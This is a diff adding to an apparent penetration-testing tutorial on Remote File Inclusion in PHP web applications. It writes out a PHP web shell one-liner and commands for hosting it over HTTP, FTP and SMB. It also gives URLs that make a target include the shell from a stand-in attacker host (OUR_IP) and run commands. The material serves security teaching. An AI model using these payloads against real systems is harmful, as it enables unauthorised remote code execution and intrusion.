@@ -18,4 +18,33 @@ The first step in gaining remote code execution is creating a malicious script i
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
-Now, all we have to do is host this script and include it through the RFI vulnerability. It is also a good idea to set our shell listener to common ports like `80` and `443`, as these ports may be whitelisted by the application's security measures.
+Now, all we have to do is host this script and include it through the RFI vulnerability. It is also a good idea to set our shell listener to common ports like `80` and `443`, as these ports may be whitelisted by the application's security measures. For example:
+```bash
+python3 -m http.server 80
+```
+Now, we can include our local shell through RFI as follows:
+```txt
+http://target-website.com/?language=http://OUR_IP/shell.php&cmd=id
+```
+### FTP
+Additionally, we may also host our shell through FTP protocol. We can use Python's `pyftpdlib` as follows:
+```bash
+python3 -m pyftpdlib -p 21
+```
+This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:
+```txt
+http://target-website.com/?language=ftp://OUR_IP/shell.php&cmd=id
+```
+If the server required valid authentication, then the credentials then be specified in the URL as follows:
+```txt
+http://target-website.com/?language=ftp://username:password@OUR_IP/shell.php&cmd=id
+```
+### SMB
+If the vulnerable web application is hosted on a Windows server, then we do not need the `allow_url_include` setting to be enabled for RFI to be possible. We can instead utilize the SMB protocol. First, we can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
+```bash
+impacket-smbserver -smb2support share $(pwd)
+```
+Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), as follows:
+```txt
+http://target-website.com/?language=\\OUR_IP\share\shell.php&cmd=whoami
+```
